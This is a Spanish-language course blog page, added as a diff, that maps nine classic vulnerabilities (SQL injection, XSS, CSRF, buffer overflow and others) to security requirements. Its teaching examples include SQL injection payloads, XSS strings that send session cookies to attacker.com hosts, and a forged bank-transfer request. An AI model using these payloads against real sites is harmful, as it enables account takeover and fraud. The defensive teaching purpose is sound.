@@ -1,0 +1,594 @@
+---
+layout: blog
+title: "Proceso de ingeniería de requisitos de seguridad"
+title_display: "Ingeniería de <em>requisitos de seguridad</em>"
+description: "SQLi, Blind SQLi, XSS, XSS persistente, Forceful Browsing, CSRF, Buffer Overflow y Stack Smashing analizados desde el proceso de ingeniería de requisitos de seguridad."
+subject_code: SEG-03
+subject_name: Seguridad Informática
+subject_url: /seguridad-informatica/
+blog_num: "V"
+entry_type: "Entrada de portafolio"
+year: 2026
+exp_display: "IRS"
+breadcrumb_current: "Requisitos de seguridad"
+nav_back: "← Seguridad Informática"
+nav_back_url: /seguridad-informatica/
+footer_label: "Seguridad Informática · SEG-03 · Blog No. V"
+footer_link_text: "← Volver a la materia"
+footer_link_url: /seguridad-informatica/
+image: /img/ingenieriaRequisitosSeguridad.png
+
+sidebar_entries:
+  - title: "Seguridad en el SDLC: STRIDE, análisis y diseño seguro"
+    url: /seguridad-informatica/seguridad-sdlc
+    num: "I"
+  - title: "Metodologías para desarrollar software seguro"
+    url: /seguridad-informatica/metodologias-software-seguro
+    num: "II"
+  - title: "Metodología a seleccionar"
+    url: /seguridad-informatica/metodologia-seleccionada
+    num: "III"
+  - title: "Análisis estático de código"
+    url: /seguridad-informatica/analisis-estatico
+    num: "IV"
+  - title: "Ingeniería de requisitos de seguridad"
+    url: /seguridad-informatica/ingenieria-requisitos-seguridad
+    num: "V"
+  - title: "Ethical Hacking y análisis de vulnerabilidades"
+
+sidebar_stat:
+  label: "Vulnerabilidades analizadas"
+  value: "9"
+  description: "tipos de vulnerabilidades estudiadas desde la perspectiva de la ingeniería de requisitos de seguridad"
+  source: "— OWASP Top 10 · CWE/SANS 25 · 2025"
+---
+<style>
+  /* ── Severity badges ────────────────────────────────── */
+  .sev {
+    display: inline-block;
+    font-size: 9px;
+    font-weight: 800;
+    letter-spacing: 1.8px;
+    text-transform: uppercase;
+    padding: 2px 8px;
+    border-radius: 2px;
+    vertical-align: middle;
+  }
+  .sev-critical { background: #fbe8e8; color: #8b1a1a; }
+  .sev-high     { background: #fdf0e0; color: #7a4500; }
+  .sev-medium   { background: #fdf9e0; color: #6b5c00; }
+
+  /* ── Vulnerability cards ────────────────────────────── */
+  .vuln-card {
+    background: var(--white);
+    border: 0.5px solid var(--rule);
+    border-radius: 4px;
+    padding: 18px 20px;
+    margin-bottom: 14px;
+  }
+  .vuln-card .vc-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 10px;
+    flex-wrap: wrap;
+  }
+  .vuln-card .vc-name {
+    font-family: 'Playfair Display', serif;
+    font-size: 16px;
+    font-weight: 700;
+    color: var(--ink);
+    line-height: 1.2;
+  }
+  .vuln-card .vc-cwe {
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 1.5px;
+    color: var(--muted);
+    margin-left: auto;
+  }
+  .vuln-card .vc-desc {
+    font-size: 13.5px;
+    line-height: 1.7;
+    color: var(--muted);
+    margin: 0 0 10px;
+  }
+  .vuln-card .vc-how {
+    font-size: 13px;
+    line-height: 1.65;
+    color: var(--ink);
+    background: rgba(200,191,170,.15);
+    border-radius: 3px;
+    padding: 10px 14px;
+    margin-bottom: 10px;
+  }
+  .vc-req {
+    display: flex;
+    gap: 8px;
+    align-items: flex-start;
+    background: rgba(15,52,96,.05);
+    border-left: 3px solid var(--navy);
+    border-radius: 0 3px 3px 0;
+    padding: 10px 14px;
+    font-size: 13px;
+    line-height: 1.65;
+    color: var(--ink);
+  }
+  .vc-req .req-label {
+    font-size: 9px;
+    font-weight: 800;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--navy);
+    white-space: nowrap;
+    padding-top: 2px;
+  }
+
+  /* ── Category header ────────────────────────────────── */
+  .cat-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin: 28px 0 16px;
+  }
+  .cat-header .ch-icon {
+    font-size: 24px;
+  }
+  .cat-header h3 {
+    font-family: 'Playfair Display', serif;
+    font-size: 17px;
+    font-weight: 700;
+    color: var(--navy);
+    margin: 0;
+  }
+  .cat-header .ch-line {
+    flex: 1;
+    height: 0.5px;
+    background: var(--rule);
+  }
+
+  /* ── Process steps ──────────────────────────────────── */
+  .process-step {
+    display: flex;
+    gap: 16px;
+    padding: 14px 0;
+    border-bottom: 0.5px solid var(--rule);
+    align-items: flex-start;
+  }
+  .process-step:last-child { border-bottom: none; }
+  .ps-num {
+    font-family: 'Playfair Display', serif;
+    font-size: 24px;
+    font-weight: 900;
+    font-style: italic;
+    color: var(--rule);
+    min-width: 32px;
+    line-height: 1;
+    padding-top: 2px;
+  }
+  .ps-body h4 {
+    font-size: 14.5px;
+    font-weight: 700;
+    color: var(--navy);
+    margin: 0 0 4px;
+  }
+  .ps-body p {
+    font-size: 13.5px;
+    line-height: 1.65;
+    color: var(--muted);
+    margin: 0;
+  }
+
+  /* ── Map container (lightbox) ────────────────────────── */
+  .map-container {
+    position: relative;
+    border: 0.5px solid var(--rule);
+    border-radius: 4px;
+    overflow: hidden;
+    margin: 20px 0;
+    background: var(--parchment);
+  }
+  .map-container a { display: block; }
+  .page-article .map-container img {
+    width: 100%;
+    height: auto;
+    display: block;
+    transition: opacity .2s;
+  }
+  .page-article .map-container img:hover { opacity: .88; }
+  .map-zoom-hint {
+    position: absolute;
+    bottom: 10px; right: 10px;
+    background: rgba(26,22,18,.65);
+    color: #fff;
+    font-size: 11px;
+    padding: 5px 10px;
+    border-radius: 3px;
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    opacity: 0;
+    transition: opacity .2s;
+    pointer-events: none;
+  }
+  .map-container:hover .map-zoom-hint { opacity: 1; }
+  .map-caption {
+    padding: 10px 16px;
+    font-size: 12px;
+    color: var(--muted);
+    border-top: 0.5px solid var(--rule);
+    text-align: center;
+    font-style: italic;
+  }
+</style>
+
+<div class="intro-block anim anim-1">
+  <p>La ingeniería de requisitos de seguridad no consiste en listar tecnologías a implementar; consiste en identificar qué puede fallar, quién podría explotarlo y qué propiedades debe garantizar el sistema para resistirlo. Cada vulnerabilidad conocida — SQLi, XSS, Buffer Overflow, CSRF — es en realidad un requisito de seguridad que no fue especificado, revisado o validado. Este blog analiza nueve vulnerabilidades clásicas desde esa perspectiva: qué son, cómo operan y qué requisito de seguridad concreto las hubiera prevenido.</p>
+</div>
+
+<!-- SECCIÓN I — PROCESO IRS -->
+<div class="blog-section anim anim-2" id="sec-1">
+  <div class="section-num">I</div>
+  <h2>El proceso de <span class="gold">ingeniería de requisitos de seguridad</span></h2>
+  <p>La ingeniería de requisitos de seguridad (IRS) es la rama de la ingeniería de software que se ocupa de identificar, analizar, especificar y validar las propiedades de seguridad que debe satisfacer un sistema. Se desarrolla en paralelo con los requisitos funcionales y se sostiene sobre cuatro actividades principales.</p>
+
+  <div class="mt-3">
+    <div class="process-step">
+      <div class="ps-num">01</div>
+      <div class="ps-body">
+        <h4>Elicitación de requisitos de seguridad</h4>
+        <p>Identificar activos a proteger, actores maliciosos potenciales y vectores de ataque mediante <em>abuse cases</em>, análisis STRIDE y entrevistas con stakeholders de seguridad. El catálogo de vulnerabilidades conocidas (OWASP, CWE) actúa como lista de verificación.</p>
+      </div>
+    </div>
+    <div class="process-step">
+      <div class="ps-num">02</div>
+      <div class="ps-body">
+        <h4>Análisis y priorización</h4>
+        <p>Clasificar los requisitos de seguridad por probabilidad de explotación, impacto potencial (CVSS) y costo de mitigación. No todos los riesgos se tratan igual: los críticos se mitigán; los de bajo impacto pueden aceptarse o transferirse.</p>
+      </div>
+    </div>
+    <div class="process-step">
+      <div class="ps-num">03</div>
+      <div class="ps-body">
+        <h4>Especificación formal</h4>
+        <p>Redactar requisitos de seguridad verificables con criterios de aceptación claros. Ejemplo: <em>«El sistema debe rechazar toda entrada que contenga caracteres SQL especiales sin sanitizar antes de ejecutar una consulta a base de datos»</em>. Ambigüedades en esta fase son futuras vulnerabilidades.</p>
+      </div>
+    </div>
+    <div class="process-step">
+      <div class="ps-num">04</div>
+      <div class="ps-body">
+        <h4>Validación y trazabilidad</h4>
+        <p>Verificar que los requisitos de seguridad son alcanzables, no contradictorios entre sí y trazables hasta los casos de prueba de seguridad que los validan. Un requisito sin prueba de aceptación no es un requisito: es un deseo.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<hr class="rule-double"/>
+
+<!-- SECCIÓN II — INYECCIONES -->
+<div class="blog-section anim" id="sec-2">
+  <div class="section-num">II</div>
+  <h2>Inyecciones y <span class="gold">manipulación de datos</span></h2>
+  <p>Las vulnerabilidades de inyección representan el riesgo más crítico según OWASP desde 2010. Todas comparten la misma raíz: datos no confiables que se interpretan como instrucciones ejecutables.</p>
+
+  <!-- SQLi -->
+  <div class="vuln-card">
+    <div class="vc-header">
+      <span class="vc-name">SQL Injection (SQLi)</span>
+      <span class="sev sev-critical">Crítica</span>
+      <span class="vc-cwe">CWE-89</span>
+    </div>
+    <p class="vc-desc">Inserción de código SQL malicioso en campos de entrada que son concatenados directamente a una consulta de base de datos. El atacante puede leer, modificar o eliminar datos, ejecutar comandos del sistema operativo o escalar privilegios.</p>
+    <div class="vc-how">
+      <strong>Ejemplo de ataque:</strong> en un formulario de login con la consulta <code>SELECT * FROM users WHERE user='[input]' AND pass='[input]'</code>, ingresar <code>' OR '1'='1</code> como usuario convierte la condición siempre en verdadera, permitiendo el acceso sin credenciales válidas.
+    </div>
+    <div class="vc-req">
+      <span class="req-label">Requisito</span>
+      <span>El sistema <strong>debe</strong> utilizar consultas parametrizadas (prepared statements) u ORM para toda interacción con la base de datos. Queda prohibida la construcción de sentencias SQL por concatenación de cadenas con datos del usuario.</span>
+    </div>
+  </div>
+
+  <!-- Blind SQLi -->
+  <div class="vuln-card">
+    <div class="vc-header">
+      <span class="vc-name">Blind SQL Injection</span>
+      <span class="sev sev-high">Alta</span>
+      <span class="vc-cwe">CWE-89</span>
+    </div>
+    <p class="vc-desc">Variante de SQLi donde la aplicación no devuelve los resultados de la consulta al atacante, pero sí revela información mediante comportamientos observables: tiempo de respuesta (<em>time-based</em>) o diferencias en el contenido de la página (<em>boolean-based</em>).</p>
+    <div class="vc-how">
+      <strong>Ejemplo de ataque:</strong> inyectar <code>'; IF (1=1) WAITFOR DELAY '0:0:5'--</code> en un parámetro de URL. Si la respuesta tarda 5 segundos, la inyección fue exitosa y el atacante puede inferir datos carácter a carácter con herramientas automatizadas como sqlmap.
+    </div>
+    <div class="vc-req">
+      <span class="req-label">Requisito</span>
+      <span>El sistema <strong>debe</strong> devolver mensajes de error genéricos sin revelar información de la base de datos. Los tiempos de respuesta <strong>deben</strong> ser uniformes independientemente del resultado de la consulta. Las consultas parametrizadas son obligatorias.</span>
+    </div>
+  </div>
+
+  <!-- XSS -->
+  <div class="vuln-card">
+    <div class="vc-header">
+      <span class="vc-name">Cross-Site Scripting (XSS Reflejado)</span>
+      <span class="sev sev-medium">Media</span>
+      <span class="vc-cwe">CWE-79</span>
+    </div>
+    <p class="vc-desc">El atacante inyecta un script malicioso en un parámetro de URL o formulario que el servidor devuelve reflejado en la respuesta HTTP sin sanitizar. La víctima recibe el script en su navegador al hacer clic en un enlace manipulado.</p>
+    <div class="vc-how">
+      <strong>Ejemplo de ataque:</strong> una URL como <code>/search?q=&lt;script&gt;document.location='https://attacker.com/steal?c='+document.cookie&lt;/script&gt;</code> roba las cookies de sesión de la víctima cuando el servidor devuelve el parámetro <code>q</code> sin escapar en el HTML de resultados.
+    </div>
+    <div class="vc-req">
+      <span class="req-label">Requisito</span>
+      <span>El sistema <strong>debe</strong> codificar toda salida dinámica en contexto HTML (HTML entity encoding). Las cookies de sesión <strong>deben</strong> tener la bandera <code>HttpOnly</code> para impedir su lectura desde JavaScript. Se <strong>debe</strong> implementar Content Security Policy (CSP).</span>
+    </div>
+  </div>
+
+  <!-- XSS Persistente -->
+  <div class="vuln-card">
+    <div class="vc-header">
+      <span class="vc-name">XSS Persistente (Stored XSS)</span>
+      <span class="sev sev-high">Alta</span>
+      <span class="vc-cwe">CWE-79</span>
+    </div>
+    <p class="vc-desc">El script malicioso se almacena permanentemente en la base de datos del servidor (comentarios, perfiles, mensajes) y se sirve a todos los usuarios que visiten la página afectada. Es la variante más peligrosa: no requiere que la víctima haga clic en un enlace específico.</p>
+    <div class="vc-how">
+      <strong>Ejemplo de ataque:</strong> un atacante publica un comentario con el contenido <code>&lt;img src=x onerror="fetch('https://c2.attacker.com/?d='+btoa(document.cookie))"&gt;</code>. Cada usuario que cargue la página con ese comentario ejecutará el script y enviará sus cookies al atacante.
+    </div>
+    <div class="vc-req">
+      <span class="req-label">Requisito</span>
+      <span>El sistema <strong>debe</strong> sanitizar todo contenido enviado por el usuario antes de almacenarlo y antes de renderizarlo. Se <strong>debe</strong> usar una librería de sanitización validada (DOMPurify, OWASP Java HTML Sanitizer) en lugar de implementar lógica propia de filtrado.</span>
+    </div>
+  </div>
+</div>
+
+<hr class="rule-double"/>
+
+<!-- SECCIÓN III — CONTROL DE ACCESO Y SESIÓN -->
+<div class="blog-section anim" id="sec-3">
+  <div class="section-num">III</div>
+  <h2>Control de acceso <span class="gold">y sesión</span></h2>
+  <p>Las vulnerabilidades de control de acceso permiten a un actor no autorizado acceder a recursos o ejecutar acciones que deberían estar restringidas. En la IRS se formalizan como requisitos de autorización, autenticación y gestión de sesiones.</p>
+
+  <!-- Forceful Browsing -->
+  <div class="vuln-card">
+    <div class="vc-header">
+      <span class="vc-name">Forceful Browsing</span>
+      <span class="sev sev-high">Alta</span>
+      <span class="vc-cwe">CWE-425</span>
+    </div>
+    <p class="vc-desc">El atacante accede directamente a URLs o recursos que no están enlazados en la interfaz pero tampoco están protegidos en el servidor. La aplicación solo oculta las rutas en la UI pero no implementa verificación de autorización en el backend.</p>
+    <div class="vc-how">
+      <strong>Ejemplo de ataque:</strong> la aplicación muestra <code>/dashboard</code> solo a usuarios autenticados, pero la URL <code>/admin/users/export</code> es accesible directamente sin autenticación porque el servidor no valida el rol del solicitante, solo omitió el enlace en el menú.
+    </div>
+    <div class="vc-req">
+      <span class="req-label">Requisito</span>
+      <span>El sistema <strong>debe</strong> verificar la autorización del usuario en el servidor para <em>cada</em> petición a un recurso protegido, independientemente de si existe o no un enlace visible en la interfaz. La seguridad por oscuridad no es un control de acceso válido.</span>
+    </div>
+  </div>
+
+  <!-- CSRF -->
+  <div class="vuln-card">
+    <div class="vc-header">
+      <span class="vc-name">Cross-Site Request Forgery (CSRF)</span>
+      <span class="sev sev-high">Alta</span>
+      <span class="vc-cwe">CWE-352</span>
+    </div>
+    <p class="vc-desc">Un sitio malicioso induce al navegador de la víctima — ya autenticada en la aplicación objetivo — a enviar una petición HTTP legítima sin su conocimiento. El servidor procesa la petición porque las cookies de sesión se adjuntan automáticamente.</p>
+    <div class="vc-how">
+      <strong>Ejemplo de ataque:</strong> la víctima está logueada en su banco. Visita una página maliciosa que contiene <code>&lt;img src="https://banco.com/transfer?to=attacker&amp;amount=5000"&gt;</code>. El navegador envía la petición GET con las cookies de sesión válidas y el banco procesa la transferencia.
+    </div>
+    <div class="vc-req">
+      <span class="req-label">Requisito</span>
+      <span>Toda operación que modifique estado (transacciones, cambios de configuración, eliminaciones) <strong>debe</strong> incluir un token CSRF único, aleatorio y vinculado a la sesión del usuario. El servidor <strong>debe</strong> validar este token en cada petición antes de procesar la acción.</span>
+    </div>
+  </div>
+</div>
+
+<hr class="rule-double"/>
+
+<!-- SECCIÓN IV — VULNERABILIDADES DE MEMORIA -->
+<div class="blog-section anim" id="sec-4">
+  <div class="section-num">IV</div>
+  <h2>Vulnerabilidades <span class="gold">de memoria</span></h2>
+  <p>Los errores de gestión de memoria son la categoría de vulnerabilidades más antigua y, en sistemas críticos escritos en C/C++, siguen siendo las de mayor impacto. Permiten al atacante ejecutar código arbitrario con los privilegios del proceso vulnerado.</p>
+
+  <!-- Buffer Overflow -->
+  <div class="vuln-card">
+    <div class="vc-header">
+      <span class="vc-name">Desbordamiento de buffer (Buffer Overflow)</span>
+      <span class="sev sev-critical">Crítica</span>
+      <span class="vc-cwe">CWE-120</span>
+    </div>
+    <p class="vc-desc">Ocurre cuando un programa escribe más datos en un buffer de los que caben, sobreescribiendo regiones de memoria adyacentes. El atacante puede controlar la dirección de retorno de una función y redirigir la ejecución hacia código malicioso (shellcode).</p>
+    <div class="vc-how">
+      <strong>Ejemplo de ataque:</strong> una función C usa <code>strcpy(buffer, input)</code> donde <code>buffer</code> tiene 64 bytes pero <code>input</code> puede ser de hasta 256. Al enviar 200 bytes de datos, el atacante sobreescribe la dirección de retorno en la pila con la dirección de su shellcode previamente depositado en el buffer.
+    </div>
+    <div class="vc-req">
+      <span class="req-label">Requisito</span>
+      <span>El sistema <strong>debe</strong> validar la longitud de toda entrada antes de copiarla en un buffer. Queda prohibido el uso de funciones inseguras (<code>gets</code>, <code>strcpy</code>, <code>sprintf</code>). Se <strong>deben</strong> habilitar protecciones del compilador: Stack Canaries, ASLR y DEP/NX.</span>
+    </div>
+  </div>
+
+  <!-- Stack Smashing -->
+  <div class="vuln-card">
+    <div class="vc-header">
+      <span class="vc-name">Stack Smashing</span>
+      <span class="sev sev-critical">Crítica</span>
+      <span class="vc-cwe">CWE-121</span>
+    </div>
+    <p class="vc-desc">Variante específica del buffer overflow que ocurre en la pila de llamadas (<em>call stack</em>). El atacante sobreescribe el <em>stack frame</em> de una función, corrompiendo el puntero de retorno, variables locales o el puntero al frame anterior para tomar control del flujo de ejecución.</p>
+    <div class="vc-how">
+      <strong>Ejemplo de ataque:</strong> explotación clásica de <em>smash the stack</em> (Aleph One, 1996): al sobrepasar un buffer local, el atacante rellena la memoria con instrucciones NOP (<em>NOP sled</em>) seguidas de shellcode y reemplaza el puntero de retorno para saltar al NOP sled, ejecutando el payload con privilegios del proceso.
+    </div>
+    <div class="vc-req">
+      <span class="req-label">Requisito</span>
+      <span>El sistema <strong>debe</strong> compilarse con <em>Stack Canaries</em> (<code>-fstack-protector-all</code>) para detectar corrupción del stack en tiempo de ejecución. Se <strong>debe</strong> activar ASLR a nivel de sistema operativo y DEP/NX para impedir la ejecución de código en la pila.</span>
+    </div>
+  </div>
+</div>
+
+<hr class="rule-double"/>
+
+<!-- SECCIÓN V — VULNERABILIDAD DE SOFTWARE -->
+<div class="blog-section anim" id="sec-5">
+  <div class="section-num">V</div>
+  <h2>Vulnerabilidad de software: <span class="gold">concepto y gestión</span></h2>
+  <p>Una <strong>vulnerabilidad de software</strong> es una debilidad en el diseño, implementación, configuración o gestión de un sistema que puede ser explotada por un actor malicioso para causar un impacto no deseado sobre la confidencialidad, integridad o disponibilidad del sistema o sus datos.</p>
+
+  <div class="row g-3 mt-2">
+    <div class="col-md-4">
+      <div class="benefit-card">
+        <div class="benefit-icon">🔍</div>
+        <h3>CVE</h3>
+        <p><em>Common Vulnerabilities and Exposures</em>. Identificador único y público para cada vulnerabilidad conocida. Base de la comunicación entre proveedores, investigadores y equipos de seguridad.</p>
+      </div>
+    </div>
+    <div class="col-md-4">
+      <div class="benefit-card">
+        <div class="benefit-icon">📊</div>
+        <h3>CVSS</h3>
+        <p><em>Common Vulnerability Scoring System</em>. Puntuación 0–10 que mide la severidad de una vulnerabilidad considerando vector de ataque, complejidad, privilegios requeridos e impacto.</p>
+      </div>
+    </div>
+    <div class="col-md-4">
+      <div class="benefit-card">
+        <div class="benefit-icon">📋</div>
+        <h3>CWE</h3>
+        <p><em>Common Weakness Enumeration</em>. Catálogo de tipos de debilidades de software — más abstracto que CVE; describe la clase de error (ej. CWE-89: SQL Injection) en lugar de la instancia específica.</p>
+      </div>
+    </div>
+  </div>
+
+  <p class="mt-3">Desde la IRS, la gestión de vulnerabilidades de software se traduce en requisitos concretos: <strong>política de actualizaciones</strong> (el sistema debe mantenerse con dependencias sin CVE de severidad alta o crítica), <strong>análisis de composición</strong> (SCA sobre librerías de terceros en cada build) y <strong>divulgación responsable</strong> (el equipo debe tener un proceso documentado de respuesta a CVE reportadas externamente).</p>
+
+  <div class="pull-quote anim">
+    <p>Una vulnerabilidad que no está en el modelo de amenazas es una vulnerabilidad que llegará a producción. La ingeniería de requisitos de seguridad convierte el catálogo de vulnerabilidades conocidas en la lista de verificación del equipo de desarrollo.</p>
+    <cite>— OWASP Software Assurance Maturity Model (OpenSAMM) v2.0</cite>
+  </div>
+</div>
+
+<hr class="rule-double"/>
+
+<!-- SECCIÓN VI — TABLA RESUMEN -->
+<div class="blog-section anim" id="sec-6">
+  <div class="section-num">VI</div>
+  <h2>Tabla resumen: <span class="gold">vulnerabilidad → requisito</span></h2>
+  <div class="table-responsive">
+    <table class="styled-table">
+      <thead>
+        <tr>
+          <th>Vulnerabilidad</th>
+          <th>Categoría</th>
+          <th>Severidad</th>
+          <th>Requisito de seguridad clave</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>SQL Injection</strong></td>
+          <td>Inyección</td>
+          <td><span class="sev sev-critical">Crítica</span></td>
+          <td>Consultas parametrizadas obligatorias</td>
+        </tr>
+        <tr>
+          <td><strong>Blind SQLi</strong></td>
+          <td>Inyección</td>
+          <td><span class="sev sev-high">Alta</span></td>
+          <td>Errores genéricos + tiempos de respuesta uniformes</td>
+        </tr>
+        <tr>
+          <td><strong>XSS Reflejado</strong></td>
+          <td>Scripting</td>
+          <td><span class="sev sev-medium">Media</span></td>
+          <td>Codificación de salida + CSP + HttpOnly</td>
+        </tr>
+        <tr>
+          <td><strong>XSS Persistente</strong></td>
+          <td>Scripting</td>
+          <td><span class="sev sev-high">Alta</span></td>
+          <td>Sanitización al almacenar y al renderizar</td>
+        </tr>
+        <tr>
+          <td><strong>Forceful Browsing</strong></td>
+          <td>Control de acceso</td>
+          <td><span class="sev sev-high">Alta</span></td>
+          <td>Autorización en servidor en cada petición</td>
+        </tr>
+        <tr>
+          <td><strong>CSRF</strong></td>
+          <td>Sesión</td>
+          <td><span class="sev sev-high">Alta</span></td>
+          <td>Token CSRF por sesión en operaciones de estado</td>
+        </tr>
+        <tr>
+          <td><strong>Buffer Overflow</strong></td>
+          <td>Memoria</td>
+          <td><span class="sev sev-critical">Crítica</span></td>
+          <td>Validación de longitud + funciones seguras + ASLR/NX</td>
+        </tr>
+        <tr>
+          <td><strong>Stack Smashing</strong></td>
+          <td>Memoria</td>
+          <td><span class="sev sev-critical">Crítica</span></td>
+          <td>Stack Canaries + compilación con -fstack-protector-all</td>
+        </tr>
+        <tr>
+          <td><strong>Vulnerabilidad de software</strong></td>
+          <td>Gestión</td>
+          <td>Variable</td>
+          <td>Política de actualizaciones + SCA + proceso CVE</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<hr class="rule-double"/>
+
+<!-- SECCIÓN VII — EVIDENCIA -->
+<div class="blog-section anim" id="sec-7">
+  <div class="section-num">VII</div>
+  <h2>Evidencia de <span class="gold">la prueba realizada</span></h2>
+  <p>La siguiente captura documenta la prueba práctica realizada en el marco del proceso de ingeniería de requisitos de seguridad, donde se identificaron y analizaron las vulnerabilidades estudiadas en esta entrada.</p>
+
+  <div class="map-container">
+    <a href="{{ '/img/ingenieriaRequisitosSeguridad.png' | relative_url }}"
+       class="glightbox"
+       data-title="Proceso de ingeniería de requisitos de seguridad — Evidencia de prueba"
+       data-description="Prueba práctica · Seguridad Informática, SEG-03 · 2026">
+      <img
+        src="{{ '/img/ingenieriaRequisitosSeguridad.png' | relative_url }}"
+        alt="Evidencia de prueba — Ingeniería de requisitos de seguridad · SEG-03"
+      />
+      <div class="map-zoom-hint">
+        <svg width="13" height="13" viewBox="0 0 13 13" fill="none">
+          <circle cx="5.5" cy="5.5" r="4.5" stroke="currentColor" stroke-width="1.3"/>
+          <path d="M9 9l3 3" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/>
+          <path d="M5.5 3.5v4M3.5 5.5h4" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/>
+        </svg>
+        Clic para ampliar
+      </div>
+    </a>
+    <div class="map-caption">
+      Prueba de ingeniería de requisitos de seguridad &nbsp;·&nbsp; Seguridad Informática, SEG-03 &nbsp;·&nbsp; 2026
+    </div>
+  </div>
+</div>
+
+<!-- CONCLUSIÓN -->
+<div class="conclusion anim" id="sec-8">
+  <h2>Conclusión</h2>
+  <p>Cada vulnerabilidad analizada en esta entrada — desde la SQLi más elemental hasta el stack smashing más técnico — representa un requisito de seguridad que no fue capturado a tiempo. La ingeniería de requisitos de seguridad convierte el catálogo de fallos conocidos en una guía proactiva: antes de escribir código, el equipo sabe exactamente qué propiedades debe garantizar el sistema y cómo verificar que las garantiza.</p>
+  <p>El resultado no es software perfecto — la perfección absoluta no existe en seguridad — sino software donde los riesgos son conocidos, priorizados y documentados, y donde cada vulnerabilidad que llega a producción puede rastrearse hasta el requisito que faltó.</p>
+</div>
+
+<div class="tags mt-4">
+  <span class="tag">#SeguridadInformática</span>
+  <span class="tag">#RequisitosDeSeguridad</span>
+  <span class="tag">#SQLInjection</span>
+  <span class="tag">#XSS</span>
+  <span class="tag">#CSRF</span>
+  <span class="tag">#BufferOverflow</span>
+  <span class="tag">#StackSmashing</span>
+  <span class="tag">#OWASP</span>
+</div>
